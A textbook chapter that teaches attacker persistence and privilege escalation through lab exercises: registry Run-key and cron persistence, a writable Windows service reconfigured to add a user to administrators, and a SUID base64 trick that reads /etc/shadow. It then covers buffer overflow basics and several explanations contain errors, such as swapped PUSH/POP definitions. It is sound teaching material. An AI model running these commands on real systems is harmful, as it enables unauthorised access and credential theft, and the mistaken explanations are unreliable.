# Persistence and Privilege Escalation
![](endpoint_hacked.jpg)

The previous chapter covered several features of Windows and Linux operating systems that have a security impact.  Some of those features promote security while other features were utilities that could be abused.  In this chapter we will cover some common threat actor techniques after initial compromise.  We will explore some of the activities performed by attackers that are already in victim machines including how attackers gain further access into the compromised system as well as how they maintain their access overtime.  The last section of the chapter focuses on memory issues of applications that can be abused to increase permissions and sometimes obtain initial access to systems.

**Objectives**
1. Understand the post exploitation activities performed by actors after initial compromise.
2. Demonstrate persistence techniques in Windows and Linux operating systems.
3. Conduct privilege escalation methods within compromised systems.
4. Identify buffer overflow vulnerabilities and craft exploits to hijack the application's execution flow.
## Post Exploitation
An attacker gaining access to a system is only the first milestone of their illicit behavior.  There are several ways in which an attacker gains initial access some of which we will cover later in this textbook.  One such technique could be a phishing email being sent to victim that includes some malware attached to it.  When the victim downloads and run this malware it could result in an attacker gaining remote access to their system.  

Once a threat actor gains access into a network or system they usually begin **post exploitation** activities.  These activities may influenced by the attacker's ultimate objectives but they usually include the following activities:
1. **Persistence** - Techniques used to maintain attacker access access should they be discovered or lose their initial connection.
2. **Pillage** - Enumerate a compromised system to gain an understanding of what it is used, collect data, and discover secrets such as passwords.
4. **Privilege Escalation** - Often the initial access obtained by the attacker is for a user with low privileges.  This attacker activity aims to achieve a higher level permission on the system, such as administrator or root.
5. **Pivot** - The initial system that is compromised is used as a launch point to gain access to other systems within the network, or other connected networks, in this attacker activity phase.

Each of the listed activities under post exploitation are mutually exclusive and could be performed individually and in any order.  Generally the order listed above is the order most usually seen as there is a progressive nature to the activities.  Regardless, the activities are iterative as well.  For example, an attacker that achieves initial access may pillage and discover an administrator password used to accomplish privilege escalation.  Once their privileges are escalated the attacker may then re-do their initial pillage activities in an attempt to discover more information about the system under the privileged context.  In another example, an attacker may wish to re-establish a persistence mechanism once privilege escalation has been achieved, or maybe the persistence technique relies on privilege escalation first being obtained as is the case with a new user account being created.

The following sections focus on persistence and privilege escalation techniques on Linux and Windows operating systems.  In the previous Operating System Security chapter we covered several operating system features that have material security significance as they could be abused to an attacker's advantage.  You will find that the persistence and privilege escalation techniques covered in detail within this chapter leverage the foundational knowledge of those operating system features previously covered.  We don't cover all such techniques and methods and readers are encouraged to explore the provided resources and experiment in their lab environments.
### Windows Persistence 
Attackers aiming to maintain system access to a Windows system could leverage several native operating system features.  Often the attacker will create a malicious script or executable that will be periodically ran from the victim's device.  This malware will establish a network connection to an attacker control server which will grant them remote access to the victim's machine.  Should the victim restart their device, the malicious persistence mechanism will re-run and re-establish the connection for the attacker to use.  Such malicious programs can be executed using services and startup tasks or other Windows features such as registry startup tasks covered in the previous chapter.

In some cases, the attacker will have network access to the system over remote management protocols or tools, such as *virtual network computing (VNC)*, *remote desktop protocol (RDP)* or *secure shell (SSH)*.  This could include cloud based solutions as well, such as software provided by AnyDesk, TeamViewer, or GoToMyPC.  If the attacker has the victim's username, password, and network access, they can leverage these tools and protocols to regain access to the system.  However, the attacker might not have the user's password even regardless of their initial access exploitation as often these attacks only provide the attacker with connection.  Therefore, the attacker may reset the user's password but the next time the user attempts to login they will likely  be alerted that security has been compromised.  To avoid this, an attacker may create a new user account that they can use at any time.  The username of for this new malicious account will likely be something that is easily missed by an observer, such as a generic name like "eric" or "desktop-user".  Even craftier usernames to hide the malicious use of the new account could be in reference to software that is used by the organization or system like "slack-agent" or "discord-service".  Unsuspecting system users may see these accounts and dismiss that they are malicious.  You wouldn't expect the attacker to name the malicious account something obvious like "backdoor-hacker" would you?

> [!info] Info - Windows Persistence Techniques Resource
> Many other Windows persistence techniques are covered within the InternalAllTheThings GitHub book maintained by swisskyrepo.  https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/


> [!activity] Activity - Windows Persistence with Registry
> One place an attacker can stash a malicious backdoor binary is within the run tasks of the user's registry.  In lieu of creating a network backdoor executable, which will be covered in a later chapter, I'll use the calculator (calc.exe) application as a stand in replacement to a backdoor executable.  As a compromised logged in user, I'll set a new registry key under the Windows startup run tasks pointing to the "malicious" calc.exe.  Then upon reboot, I'll log in and witness the calculator app is automatically launched.  A real threat would launch the process in the background as to not alert the victim.
> 
> After powering up the Windows machine and logging in, I open a command prompt and run the following registry command that adds the key `NotEvil` with the regular string value of the path to the calc.exe file.
> ```cmd
> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotEvil /t REG_SZ /d "C:\Windows\System32\calc.exe“
> ```
> ![[../images/06/win_persistence_reg_command.png|Adding Key to Registry Run|600]]
> The operation completes successfully.  To test it I reboot the Windows VM and witness the calculator app automatically launches at login!  This simulates re-establishing a connection if a malicious binary was running instead of the harmless calculator app.
> ![[../images/06/win_persistence_calc_launch.png|Calculator Runs at Login|300]]
> I'll inspect the registry by opening the Registry Editor application as administrator from the Windows search bar and accepting any UAC prompt.  Upon launching, I navigate to the Run key under the current user hive and find the persistence key NotEvil.
> ![[../images/06/win_persistence_regedit.png|Registry Editor Run Key with NotEvil]]
> Because I don't want the calculator app to run each time I start this VM I go ahead and delete this key by right-clicking it and selecting the Delete button from the context menu.
>   

> [!exercise] Exercise - Windows Persistence with Registry
> Using the Windows VM in Bridge Adapter network mode, you will add a Run Registry Key to launch the calculator app as a placeholder for malware.
> #### Step 1 - Add the Key
> Launch a command prompt and add the calc.exe to the Registry’s Run Key.
> ``` powershell
> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotEvil /t REG_SZ /d "C:\Windows\System32\calc.exe“
> ```
> #### Step 2 - Reboot and Execute
> Reboot the Windows VM and observe the calculator app launches at login!
> #### Step 3 - Remove Persistence
> Launch the Registry Editor as Administrator accepting the UAC prompt. Navigate to “Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” and observe the Key “NotEvil”.  Right click the NotEvil entry and Delete.

### Linux Persistence
Attackers can leverage very similar persistence techniques as Windows.  This includes creating new users and leveraging operating system features such as cron and services.  Even seemingly benign features such as the *message of the day (MOTD)*, which displays a banner message at CLI creation, can be used to hide malicious code to be executed at login.  There are many creative places a backdoor can be hidden by an attacker to maintain a foothold onto a victim computer.  Knowing what and where these operating system persistence techniques are used assist defenders particularly incident response, threat hunting, and malware analysis professionals.  Host based intrusion detection systems and antimalware solutions should also be tuned to monitor these operating system hiding spots for abnormal activity.

> [!info] Info - Linux Persistence Resource
> Swisskyrepo has also created a Linux - Persistence resource on the GitBook Internal All The Things.  Interested readers should check out this resource and the listed techniques. https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/

>[!activity] Activity - Linux Persistence with Cronjob
>Attacker persistence can be achieved using a cronjob that executes a malicious script.  I'll demonstrate this by creating a cronjob for the victim Ubuntu VM user that will run each time the machine is rebooted.  I'll use a harmless command that creates a cron.txt file on the user's desktop in lieu of creating a backdoor; however you can imagine this command being replaced with a script that makes a connection back to the attacker.
>
>With the Ubuntu VM started and the `daniel` user logged in, simulating an attacker's initial access, I create a cronjob that applies the date into a text file on the user's desktop upon reboot.  I also list the cron table to confirm the job was applied.
>```bash
>echo "@reboot date > /home/daniel/Desktop/cron.txt " | crontab 2> /dev/null
>crontab -l
>```
>![[../images/06/linux_persistence_crontab.png|Applying Cronjob Persistence Example|600]]
>Once applied I reboot the VM and login as the user.  Upon login I can see that the cron.txt file was created and now exists on the desktop!  While this document isn't exactly scary, you can imagine if instead a binary or script was ran that reaches back out to the attacker's server and establishes a remote terminal session on the device.
>![[../images/06/linux_persistence_cron_success.png|Cronjob Executed Creating Text File|300]]
>Because I don't want this file to be created each time I reboot, I remove the cronjob with the following command and delete the cron.txt file.
>```bash
>echo "" | crontab 2> /dev/null
>crontab -l
>```
>![[../images/06/linux_persistence_removed.png|Cronjob Persistence Removed|600]]

> [!exercise] Exercise - Linux Persistence with Cronjob
> This task uses the Ubuntu VM in Bridge Adapter mode to schedule a cronjob that launches bash commands as a stand in for malware.
> #### Step 1 - Create the Cronjob
> Launch a bash terminal and add a cronjob that runs the date command and redirects the standard output to cron.txt file on your user’s desktop. Make sure to replace `USER` with your Ubuntu user’s name. Then run crontab -l to review and confirm the job setting.
> ``` bash
> echo "@reboot date > /home/USER/Desktop/cron.txt " | crontab 2> /dev/null
> crontab -l
> ```
> #### Step 2 - Reboot and Exploit
> Reboot the Ubuntu machine, login, and observe the cronjob created a cron.txt file on the desktop!
> #### Step 3 - Remove Persistence
> Open a terminal and remove the cronjob.
> ``` bash
> echo "" | crontab 2> /dev/null
> crontab -l
> ```
### Windows Privilege Escalation
Another task an attacker seeks to achieve after initial access is to elevate their permissions to an administrator.  Doing so allows the attacker to have full system access where they can fully pillage the device's data, disable security solutions, delete logs, and anything else they desire.  Certainly if an attacker is able to compromise an elevated user's password then they would already be running in a privileged user context.  In a previous activity, I demonstrated how to extract NTLM hashed passwords from the SAM database and crack passwords using John the Ripper tool.  However, accessing the SAM and SYSTEM databases required elevated access which provides a challenge to an attacker with only low privileged user access.  Sometimes a Windows system could have misconfigurations or vulnerabilities that can be leveraged by an attacker to gain access to such areas.

> [!story] Story - HiveNightmare
> In 2021 a vulnerability CVE-2021-36934, known as HiveNightmare and SeriousSAM, was disclosed in which the Windows *volume shadow copy service (VSS)* was found to be making copies of sensitive SAM and SYSTEM files with global read access.  If an attacker gained access to the device they could dump hashed passwords and attempt offline cracking or perform pass-the-hash attacks.  These files include the local administrator hashed passwords which could easily lead to privilege escalation.

Privilege escalation vulnerabilities can also be found within the Windows *kernel*, which is the core of the operating system that interfaces with all connected hardware.  The kernel runs with SYSTEM permissions and all users interface with it during normal use of the operating system.  Vulnerabilities in the kernel can often result in privilege escalation because the kernel expects user interaction and input.  Such vulnerabilities often have exploits created which are accessible on the clear web, such as on GitHub or on ExploitDB.  A quick search on ExploitDB for Windows shows several available exploits including a recent kernel based privilege escalation for Windows 11 22h2. [^1]
![[../images/06/exploit_db.png|ExploitDB Windows Search]]
Selecting that exploit link provides us with the source code and references.  Often these exploits will even include instructions on how to compile them.  Looks like for this one we are on our own for figuring that out.
![[../images/06/exploit_db_code.png|Kernel Exploit Code from ExploitDB]]
Actually, all of the exploits from this website are already included on the Kali VM.  They are searchable and using the `searchsploit` command followed by a query term as shown in the following image.
![[../images/06/exploitdb_searchsploit.png|Searchsploit Windows Query|600]]
After identifying the target exploit using `searchsploit`, you can copy it and use it as needed.  Here we find the same C program as on the ExploitDB website.
![[../images/06/exploitdb_searchsploit_copy.png|Searchsploit Copy of Kernel Exploit|600]]
> [!info] Info - Windows Privilege Escalations Resource
> There are many kernel privilege escalation exploits but they are not the only method of access as there can be misconfigurations on a system as well that leaves it vulnerable.  Another of my favorite security websites is Carlos Polop's Hacktricks book which includes a long list of viable attacks.  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

Consider the running processes on the Windows VM that we previously reviewed.  Some of those processes run in an elevated context, as the SYSTEM account or as our logged in user who is a member of the local administrators group.  If an attacker can hijack any of those running elevated processes then they could run any command or perform any activity from that process.  We also covered Windows services which launch an executable from an event such as the machine's start up.  Every service that launches will create a process under the user context configured as part of the service.  A Windows service could be hijacked if it includes an *unquoted service path*.  For example, if the path has a folder writable by an attacker and that folder's name includes spaces such as "Program Files", the attacker can place a malicious binary in a folder with the first word of that two spaced word folder name ("Program").  Due to a quirk on how executable are found by the operating system, Windows will search for the binary in the path first checking the name of the folder with the first word. 

>[!activity] Activity - Windows Service Privilege Escalation
>Another possible misconfiguration using Windows service is when an administrator grants too many permissions to the service.  I will demonstrate how an administrator can give a custom service permissions to all users to write, modify, and run a service.  A malicious user can then abuse this misconfigured and vulnerable service to escalate their privileges.
>
>From the Windows VM I start by setting up a vulnerable service simulating a careless system administrator.  With a command prompt started as an administrator, I use the sc command to create a service named `vulnerable`.  I give this service the binary path to the SearchIndexer executable to mimic an existing legitimate service.
>```shell
>sc create vulnerable binPath= "C:\Windows\system32\SearchIndexer.exe /Embedding”
>```
>![[../images/06/win_privesc_service_create.png|Creating a Windows Service|600]]
>After the service is successfully created, I update the ACL of the service to be world writable using the sdset option of the sc command.  This setting allows any user to modify the service opening it up to abuse.  The long string that is included within the command can be deciphered using Winhelponline's great article.  [^2]
>```cmd
>sc sdset vulnerable "D:(A;;CCLCSWRPWPDTLOCRRC;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCLCSWLOCRRC;;;WD)(A;;CCLCSWLOCRRC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
>```
>![[../images/06/win_privesc_permissions.png|Setting Permissions on Vulnerable Service|600]]
>The last component of the vulnerable setup is to have a low privileged user that we will use as the simulated victim an attacker has compromised.  Using the net commands I check my system and see that I still have the `tester` user created from a previous activity.  I also confirm that the tester user is not a member of the local administrators group.
>```cmd
>net user
>net localgroup administrators
>```
>![[../images/06/win_privesc_net_user.png|Confirming Low Privileged User Tester Exists|600]]
>My `daniel` user is a member of the local administrator group but `tester` is not.  I log out of the `daniel` account and then login as the `tester` user.  Then I open a command prompt (non-admin), as the attacker who compromised the `tester` user, and update the vulnerable service with a new command.  This malicious command adds the `tester` user to the local administrators group.
>```cmd
>sc config vulnerable binpath= "net localgroup administrators tester /add"
>```
>![[../images/06/win_privesc_update_service.png|Updating Vulnerable Service With Malicious Command|600]]
>The service has been updated with my new command.  Once the service is restarted, such as during a reboot, the `tester` user should be made an administrator.  The service can do this because it runs as the SYSTEM user and can run any valid command on the system.  If I tried adding the `tester` user to the admin group with just that net localgroup command, I would receive a permission denied error.  I can force the service start by running the following command.
>```cmd
>sc start vulnerable
>```
>![[../images/06/win_privesc_start_service.png|Starting Windows Vulnerable Service|600]]
>Notice the StartService failure message?  This is because the command provided as a binary path isn't a valid binary.  But the command should have still ran regardless of the failure message.  To confirm, I re-run the net localgroup command and see that the `tester` user is now a member of the local administrator group!
>```cmd
>net localgroup administrators
>```
>![[../images/06/win_privesc_success.png|Tester User Privileges Escalated to Local Admin|600]]
>For sake of clean up, I remove the vulnerable service with the following command.
>```cmd
>sc delete vulnerable
>```
>![[../images/06/win_privesc_cleanup.png|Removing Vulnerable Service|600]]

> [!exercise] Exercise - Windows Service Privilege Escalation
> You will create a vulnerable service and then escalate your privileges by exploiting this service in your Windows VM with Bridge Adapter network mode.
> #### Step 1 - Setup Vulnerable Service
> Start command prompt as administrator and create a vulnerable service that we will use for privilege escalation.
> ``` powershell
> sc create vulnerable binPath= "C:\Windows\system32\SearchIndexer.exe /Embedding”
> ```
> Add User Permissions to modify service. The WD at the end of each Allow statement make each permission set world available.
> ``` powershell
> sc sdset vulnerable "D:(A;;CCLCSWRPWPDTLOCRRC;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCLCSWLOCRRC;;;WD)(A;;CCLCSWLOCRRC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
> ```
> #### Step 2 - Tester User
> The tester user may already exist from previous labs. Open a regular command prompt (non-administrator) and check the user list and confirm the tester user is present.
> ``` powershell
> net user
> ```
> If the tester user is not present, create the user.
> ``` powershell
> net user tester /add
> ```
> Confirm the tester user IS NOT present in the Administrators group.
> ```powershell
> net localgroup administrators
> ```
> #### Step 3 - Exploit Service
> As normal login user, launch a command prompt (not as admin). Modify the vulnerable service to add the tester user to the administrators group.
> ``` powershell
> sc config vulnerable binpath= "net localgroup administrators tester /add"
> ```
> Start the vulnerable service to run the payload. Observe that the service “FAILED”.
> ``` powershell
> sc start vulnerable
> ```
> Check administrators again and observe the tester user now has privileges escalated! Even though the service start command failed, it still ran in an elevated context and executed our code.
> ``` powershell
> net localgroup administrators
> ```
> #### Step 4 - Tear Down the Vulnerable Service
> Open a command prompt as administrator
> ``` powershell
> sc delete vulnerable
> ```

### Linux Privilege Escalation
Just like Windows operating system, Linux has very similar privilege escalation paths that include the exploitation of kernel vulnerabilities, abusing cronjobs (Schedule Tasks in Windows), and abusing misconfigured services.  Linux also has many interesting privilege escalation vectors that Windows doesn't due to the differences between how the systems operate and other features.  Interested readers should visit Carol Polop's HackTricks Linux Privilege Escalation page for additional methods, it is one worth bookmarking and referencing as needed. [^3]

> [!info] Info - Finding Privilege Escalation Paths
> Even though I don't cover privilege escalation enumeration tools within activities in this textbook, they are at least worth an honorable mention.  You can conceive that it would be possible to manually check for privilege escalation vulnerabilities as either a defender or as an attacker.  However, that would be cumbersome and an inefficient use of time especially where such a task can be automated using a tool.  For example, one of the Windows privilege escalation paths covered involved a misconfigured service that allowed world writable access to the service's execution path running as SYSTEM.  A tool could be used that was developed to check all services and report back any such misconfigurations.  The idea of automated scans checking for privilege escalation vulnerabilities to all known and testable paths for Windows and Linux systems provides security professionals with an opportunity to find where systems may be vulnerable.  Once identified these vulnerabilities can be abused or fixed - depending on who finds them first!
> 
> A great tool for Windows, Linux, and MacOS systems is the PEASS-ng series which can be found on GitHub by carlospolop (https://github.com/carlospolop/PEASS-ng).  I have used this tool many times on many engagements, it is both reliable and efficient at finding most privilege escalation paths.

Several demonstrations throughout this book use the `sudo` command to elevate permissions to root.  Sudo is configured within the sudoers file and requires administrator level access to modify it.  However, it can often be misconfigured to provide more access than what is needed for a user so administrators may strive to apply the principle of least privilege and configure a user's sudoers entry to only apply to specific executables.  Therefore a configured user would only be able to run a specific command under the privileged user context and greatly limit the opportunity for abuse.  Regardless, depending on the executable, the user or attacker could abuse the elevated command to perform elevated tasks and achieve and escalation of privileges.  

In the Operating System Security chapter we examined what SUID executables are and how they work to provide users permissions to run the executable as the file's owner.  Similar to the sudo abuses to escalate privileges, SUIDs too can be abused by an attacker to potentially achieve and escalation of privilege.  One of my favorite websites that itemizes sudo and SUID privilege escalation abuses is GTFOBins.  It maintains a curated list of many native Linux binaries and known ways they can be abused.  The following image shows how the `base64` command can be used to escalate privileges for SUID and sudo if a system is misconfigured. [^4]

![[../images/06/gtfobins.png|Base64 Page From GTFOBins Website]]


> [!activity] Activity - Linux SUID Privilege Escalation
> Let's explore how an administrator may configure base64 to be ran as root through the SUID feature of Linux.  I'll setup a vulnerable copy of the binary and then login as a low privilege user.  Then I'll abuse the SUID binary to extract privileged content from the shadow file which could then later be used to crack administrators' passwords.
> 
> I start by logging into the Ubuntu machine with my normal user and opening a terminal.  From that terminal I copy the base64 binary to the desktop while setting its sticky bit making it SUID capable.  Listing out the file shows that the sticky bit is set for the root owner.
> ```bash
> sudo install -m =xs $(which base64) .
> ls -la base64
> ```
> ![[../images/06/linux_privesc_base64_copy.png|Creating Vulnerable Base64 Binary|600]]
> The action above simulates a system administrator configuring the binary for elevated use.  Although the `daniel` user is a member of the sudo group, I won't use sudo to access the restricted shadow file.  For example, attempting to cat the shadow file or base64 encoding it results in permission denied messages.  I use the which command to find the original base64 binary and specify its use when testing the shadow file.
> ```bash
> cat /etc/shadow
> which base64
> /usr/bin/base64 /etc/shadow
> ```
> ![[../images/06/linux_privesc_denied.png|Permission Denied Accessing Shadow File|600]]
> Now the user can abuse the SUID base64 binary version that is installed on the desktop by base64 encoding the shadow file and then base64 decoding the encoded output to reveal the contents of the shadow file!
> ```bash
> ./base64 "/etc/shadow" | base64 --decode
> ```
> ![[../images/06/linux_privesc_base64_abuse.png|Abusing Base64 SUID Revealing Shadow Contents|600]]
> The output to the command above displays the root user's hashed password which can be attempted to brute force offline and then used to escalate privileges to the root user. 

> [!exercise] Exercise - Linux SUID Privilege Escalation
> In this task you will create a vulnerable SUID binary and then exploit it to escalate privileges to the root user using the Ubuntu VM in Bridge Adapter network mode.
> #### Step 1 - Create Vulnerable SUID
> Install a base64 binary with the root SUID bit set in the current directory. Then list the file and observe it is owned by root and world executable. This means that any user on the system can run the binary as the root user.  Don’t miss the period at the end of the command.
> ``` bash
> sudo install -m =xs $(which base64) .
> ```
> #### Step 2 - Abuse SUID
> As your normal user, try dumping the contents of the shadow file which should only be accessible by root. Observe that permission is denied.
> ``` bash
> cat /etc/shadow
> ```
> Abuse the base64 SUID binary to display the contents of the shadow file. The “./” preceding the base64 binary runs the vulnerable binary located in the current directory. The full command base64 encodes the shadow file and pipes the results to base64 with the decode flag, which displays the full contents of the privileged file!
> ``` bash
> ./base64 "/etc/shadow" | base64 --decode
> ```
## Buffer Overflows
Programs, regardless of the operating system, rely on the use of *read access memory (RAM)* to store code and data to be executed by the CPU.  When a program is ran it loads its code and data into memory where it sits until the CPU is ready to process it.  Lower level programming languages, or programming language compliers or interpreters, manage the program's planned memory utilization during development.  When the program is eventually executed all the prescribed memory space is created.  Sometimes a program will be unaware what inputs it will receive and some amount of memory space will be allocated; however, without proper protections, if the volume of input the program receives exceeds the memory space allotted the program will likely misbehave and crash.  In this section we will explore the basics of how programs interact with the hardware of the system, tools to observe this behavior, and the security implications caused by program memory mismanagement.
### Basics
While this textbook is not meant to teach the reader low level hardware and software interactions, nor is it meant to teach assembly development, we will cover the basics to in an effort to provide a basic working knowledge and conceptual level.  Interested readers who are not already familiar with assembly language development and how memory works inside a computer's operations should research more on the matter.
#### Assembly Language
All higher level programs, such as JavaScript, are eventually translated into instruction *machine code* that the CPU can execute.  **Assembly language** is the lowest level language that all higher level languages are built on top of.  Assembly's hexadecimal encoding, known as *shellcode*, is ultimately what is stored onto memory and processed by the CPU.  Assembly is not a feature rich language and excludes many abstractions higher level languages use.  For example the creation of a raw socket can be quite trivially created in Python with a single line of code whereas this same feat in assembly requires many lines of code excluding the use of functions.  For what assembly is missing in features it makes up for in simplicity.  Only one statement per line is permitted with the a simple syntax of `[label] mnemonic [operands] [;comment]`.  Actually, assembly is deceivingly simple essentially requiring the program to feed piece by piece of data through memory and CPU registers which can require a lot of cognitive load.

The mnemonic section of a statement informs the operation activity to be conducted.  The following non-exhaustive list are some of the more common assembly mnemonics and descriptions:

- MOV - Short for "move" which copies data from one location onto another.
- JMP - Or "jump" instructing the internal pointer to go to another memory location.
- CALL - Run a subroutine.
- RET - "Return" the pointer to another memory location.
- POP - Put data onto the memory stack.
- PUSH - Remove data from the memory stack.
- NOP - Meaning "no operation" where the pointer passes over the statement to the next statement

> [!note] Note - Assembly Mnemonic Full List
> Checkout Wikipedia's x86 Instruction Listings for a richer list of mnemonics. https://en.wikipedia.org/wiki/X86_instruction_listings

#### Registers
The CPU stores data, memory addresses, and instructions within its own non-RAM memory space called **registers**.  Registers are the closest and therefore fastest memory storage location relative to the CPU and all instructions processed by the CPU are managed within registers.  These memory caches are predefined and vary depending on the CPU's architecture.  Regardless of the architecture, all CPUs have registers defined for handling data, addresses, pointers, and general purpose.

| 64-bit | 32-bit | 16-bit | 8-bit | Description |
| ---- | ---- | ---- | ---- | ---- |
| rax | eax | ax | ah & al | Data from returned functions |
| rcx | ecx | cx | ch & cl | Scratch space |
| rdx | edx | dx | dh & dl | Scratch space |
| rbx | ebx | bx | bh & bl | Scratch space |
| rsp | esp | sp | spl | Stack pointer, top of stack |
| rbp | ebp | bp | bpl | Base pointer, bottom of stack |
| rsi | esi | si | sil | Function arguments (2nd) |
| rdi | edi | di | dil | Function argument (1st) |
| r8 - r15 | r8d - r15d | r8w - r15w | r8b - r15b | Scratch space |
| rip | eip |  |  | Instruction pointer |
Having a firm understanding of these registers are needed in order to debug and analyze how a program interacts with memory.
#### Memory Layout
A system's CPU can only process a small amount of data, or instructions, at a time as it has a limited number of registers.  Therefore, the CPU needs to offload the storage of data onto another fast, but not as fast, cache location.  Systems leverage *random access memory (RAM)*, exactly for this task.  When an executable is initiated, its code and data are copied from disk and placed into memory where it will be used by the CPU during runtime.

Programs are initialized into memory within a block space which is separated into the *stack*, *heap*, *data*, and *text* segments.  The following illustration shows the order of the segments with the lowest (first) segment used for text and the highest segment used for the stack segment.  The space between the stack and heap segments can dynamically adjusted for either segment as needed by the program.
![[../images/06/buffer_mem_layout.png|Memory Layout Segment Order|150]]
You can think of the block of memory as a empty cup.  Water (data) fills the cup (block) from the bottom to the top.  The stack segment holds data that will be processed by program functions.  Other data used by the program is stored within the heap segment.  Global variables are located in the data segment while all the program's code is within the text segment.  Memory address space is represented as a 4 or 8 byte hexadecimal value in 32-bit or 64-bit architecture systems respectively.  As one byte includes two hexadecimal digits, the an example address for a 32-bit system would look something like `0x012A341C`. 

> [!tip] Tip - Working in Memory
> When first learning about how computer memory is organized I often confused a memory address with the data residing at that memory location as they are both in hexadecimal.  It is important to understand that both address and the values at those addresses are typically represented as hexadecimal values.

The stack segment is highly used and very dynamic.  Program functions that execute tasks usually require inputs, often called *parameters* or *variables*.  These values can be supplied from system data or even input from the user.  The variable is put onto the stack by the *POP* assembly mnemonic in a last in first out (LIFO) order.  The CPU can then reference this value from the stack using its memory address.  Once the function's execution is complete, and a new function is needed to be setup in the stack, the values are removed using the *PUSH* mnemonic.  The stack is comprised of *stack frames* for each function being executed which is illustrated in the following image.   
![[../images/06/buffer_stack.png|Stack Frame Topology|150]]

The stack's starting location has an address in memory called the *stack pointer*, at the lowest address space, and is be used to reference the stack for execution.  Above the stack pointer is the *buffer* space of the stack frame where variables are store that are used for the function during processing.  The end of the stack frame is represented as the *base pointer* which is used by the CPU to track the stack frame's ending space.  Above (higher address space) the base pointer is the *return address* which is used to notify the running program where to go next after the function's execution is complete.  
### Analysis Tools
A compiled executable file includes binary data that isn't particularly useful to a human in raw form.  If you opened such a file into a text editor you would be presented with mostly random characters from all over the Unicode standard.  Fixed variables may present themselves as in ASCII format and sometimes this can be very useful to a security researcher analyzing the program statically, or without running it.  Several secrets, such as passwords and keys, in many programs have been discovered by statically looking at a binary file in this manner.

All programs regardless of the language they were written in require compilation for the operating system to load them into memory and the CPU to process them.  While there are higher level *interpreted* and scripting languages, such as Python, which don't require compilation, they all require the use of a compiled binary to run them.  Source code, before it is compiled, is very useful to the programmer as it is in a form that is readable and understandable by humans; however, they are not much use to the computer.  So we can think of the *compiler* as the translator of human written code to a format understood by the system.  Compiling is thought of as a one-way translation but there is also a class of tooling called **decompilers** which are used to translate compiled programs back to the source code state.  The output of these tool exclude the original naming conventions for variables and functions and require human interpretation.  Another useful tool type is the **disassembler** which takes a compiled binary and translates it into its assembly language statements statically.  While tedious, any binary can be loaded into this tool type and analyzed at the assembly level to derive the program's logic without the use of a decompiler.  A popular program for both dissembling and decompiling is the open source tool Ghidra which was original developed and released by the National Security Agency (NSA).

There is another class of tool that is useful for analyzing a program during runtime called a **debugger**.  A program can be loaded into a debugger, or a debugger can be attached to an already running process, and the user can analyze the executing code in the CPU registers and memory space in real time.  Other features include the ability to set breakpoints and edit assembly instructions and data while the program runs.  Two popular Linux debuggers are *The GNU Project Debugger (GDB)* and radare2.  For Windows programs, Immunity Debugger and OllyDbg are highly versatile and commonly used.  All four tools are free to use and extensible with community support and plugins.  We will demonstrate the power of GDB in an upcoming activity.

> [!tip] Tip - Endianness
> Data sitting in memory may be written in a linear or reverse order depending on the type of architecture on the system.  The order of bytes written into memory is known as **Endianness** and requires careful consideration when manually analyzing memory.  *Big Endian* is when data is written from left to right whereas *Little Endian* is when data is written from right to left.  Endianness is a result of the designers of CPU architectures decided different ways on how to order data being streamed into memory based on a first in first out (FIFO) or a last in first out (LIFO) patterns.  The following diagram demonstrates how the decimal 1024 is written in hexadecimal in memory.  This decimal in hexadecimal encoding is `0x0400`.  Under big endian it would appear in memory as `0x0400` whereas using little endian format would be written as `0x0004`.
> ![[../images/06/buffer_endianness.png|Endianness of Decimal 1024|300]]
### Overflow Security
Careful memory management is required as programs often ingest inputs of varying size.  Such as in the case of a user supplied input, the size of the value needed in the program may not be known at the time the program is compiled so the programmer must allocate sufficient space on the stack to handle the variable.  If the developer, or compiler, does not properly handle the amount of space to be allocated in memory for the variable, they could introduce memory related security vulnerabilities.  These vulnerabilities could enable an attacker to hijack the execution flow of the program causing it to execute arbitrary code.  The impact of such a vulnerability depends on the context of the running program  For instance is the program is ran as a networked service, it could enable an attacker to gain initial access to the operating system the program is running on.  In another example, if the program is running under a privileged user context, like administrator or root, then the attacker can inject code into the program or cause the program to execute remote code under the privileged user context, known as privilege escalation.

Consciouses programmers will ensure that the buffer memory space is allocated and input boundary or size is validated before being placed on the stack.  Otherwise, the input could exceed the size of the stack and overwrite other memory spaces which is known as a **buffer overflow**.  Therefore a input which is not validated can be crafted that overwrites the index pointer with an address to a section of memory desired by the attacker.  That address can lead to areas in memory that executes code controlled or desired by the attacker.  This includes the attacker storing their own code into memory or leveraging commands already existing in memory chained together into what is known as *gadgets*.

>[!note] Note - Memory Security Issues
>There are many security issue related to the management of memory for a program.  While we cover a *stack based buffer overflow*, there are heap-based overflows, integer overflows, and others.  Interested readers are encouraged to research and explore the depths of this area of security!

A well written program can avoid memory security issues and the vulnerabilities related to them.  However, there are also security protections the compiled program and leverage in coordination with the operating system.  The **data execution preventions (DEP)** setting can be applied at the operating system level to enforce permissions on buffer space to be read and write only, preventing execution.  This prevents overflow vulnerabilities to some degree by ensuring any malicious code written to the buffer space can't be executed.  But its protections are limited as it does not prevent the overflow and other areas of existing executable memory can be used to run malicious code.  Operating systems also include an **address space layout randomization (ASLR)** security mode that ensures the memory space used by the program is different each time the program runs.  This security setting makes it more difficult for exploit developers to create a malicious payload that targets other malicious code in memory, as they won't know where that malicious code resides because the address space is different every time the program launches.  ASLR can be bypassed using brute force techniques where the address space is found via guess and check.  The last security measure we'll cover is the **canary** method in which the operating system applies a small random value, a *canary token*, in every stack frame.  The canary token is checked before code in the frame is executed and if it does not match the program won't execute the stack.  It is possible to bypass this technique by leveraging an overflow vulnerability to collect the canary token value and include it in the final malicious payload.

> [!activity] Activity - Stack Smashing the Hidden Function
